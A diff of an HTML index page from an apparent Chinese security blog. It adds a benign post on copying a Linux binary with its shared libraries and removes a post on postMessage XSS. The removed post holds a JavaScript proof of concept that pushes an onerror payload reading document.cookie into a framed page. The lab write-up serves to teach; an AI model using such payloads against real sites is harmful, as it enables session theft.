@@ -117,6 +117,142 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/03/09/copy-shared-lib.html" >Linux复制带动态库的命令</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-03-09  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
+<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
+	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
+	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
+	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+
+if [ $# !&#x3D; 2 ] ; then
+    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
+    exit 1
+fi
+
+PATH_TO_BINARY&#x3D;&quot;$1&quot;
+TARGET_FOLDER&#x3D;&quot;$2&quot;
+
+# if we cannot find the the binary we have to abort
+if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
+    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
+    exit 1
+fi
+
+# copy the binary to the target folder
+# create directories if required
+echo &quot;---&gt; copy binary itself&quot;
+cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;
+
+# copy the required shared libs to the target folder
+# create directories if required
+echo &quot;---&gt; copy libraries&quot;
+for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
+   if [ -f &quot;$lib&quot; ] ; then
+        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
+   fi  
+done
+
+# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
+# however, I&#39;ve not tested that yet
+# create lib64 - if required and link the content from lib to it
+if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
+    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
+fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
+<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
+	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
+	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
+	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+
+if [ $# !&#x3D; 2 ] ; then
+    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
+    exit 1
+fi
+
+PATH_TO_BINARY&#x3D;&quot;$1&quot;
+TARGET_FOLDER&#x3D;&quot;$2&quot;
+
+# if we cannot find the the binary we have to abort
+if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
+    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
+    exit 1
+fi
+
+# copy the binary to the target folder
+# create directories if required
+echo &quot;---&gt; copy binary itself&quot;
+cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;
+
+# copy the required shared libs to the target folder
+# create directories if required
+echo &quot;---&gt; copy libraries&quot;
+for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
+   if [ -f &quot;$lib&quot; ] ; then
+        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
+   fi  
+done
+
+# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
+# however, I&#39;ve not tested that yet
+# create lib64 - if required and link the content from lib to it
+if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
+    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
+fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/03/02/xss-encode-decode.html" >xss基础编码</a>
 		</h3>
 		</div>
@@ -691,88 +827,6 @@ SP is stack pointer. The stack is generally used to hold &quot;automatic&quot; v
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/01/07/n0js-case-postMessage-xss.html" >n0js case3</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-01-07  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
-<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
-</ul>
-<p>在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：</p>
-<p>简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。</p>
-<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
-t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
-&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
-document.body.appendChild(t);
-
-function a()&#123;
-var b &#x3D; document.createElement(&quot;button&quot;);
-b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
-&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
-document.body.appendChild(b);
-b.click();
-&#125;
-&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
-window.onload &#x3D; a();
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2017/01/07/n0js-case-postMessage-xss.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
-<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
-</ul>
-<p>在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：</p>
-<p>简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。</p>
-<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
-t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
-&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
-document.body.appendChild(t);
-
-function a()&#123;
-var b &#x3D; document.createElement(&quot;button&quot;);
-b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
-&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
-document.body.appendChild(b);
-b.click();
-&#125;
-&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
-window.onload &#x3D; a();
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2017/01/07/n0js-case-postMessage-xss.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -824,7 +878,7 @@ window.onload &#x3D; a();
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>6</span></a></li>
+			<li><a href="/categories/Java/">Java<span>7</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -851,6 +905,10 @@ window.onload &#x3D; a();
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
+      </li>
+    
+      <li>
         <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
       </li>
     
@@ -864,10 +922,6 @@ window.onload &#x3D; a();
     
       <li>
         <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
       </li>
     
   </ul>
